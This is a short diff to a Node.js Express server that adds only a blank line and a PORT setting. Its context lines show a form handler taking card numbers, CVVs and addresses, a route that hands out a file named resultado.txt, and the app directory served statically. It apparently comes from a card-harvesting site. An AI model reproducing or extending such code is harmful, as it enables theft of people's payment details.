@@ -37,6 +37,7 @@ app.get('/dashboard', (req, res) => {
   });
 });
 
+
 // Endpoint para descargar resultado.txt
 app.get('/descargar-resultado', (req, res) => {
   const filePath = path.join(__dirname, 'resultado.txt');
@@ -44,6 +45,8 @@ app.get('/descargar-resultado', (req, res) => {
 });
 
 app.use(express.static(__dirname));
+
+const PORT = process.env.PORT || 3000;
 
 app.post('/submit', (req, res) => {
   const { cardnumber, expmonth, expyear, cvv, firstname, lastname, address } = req.body;
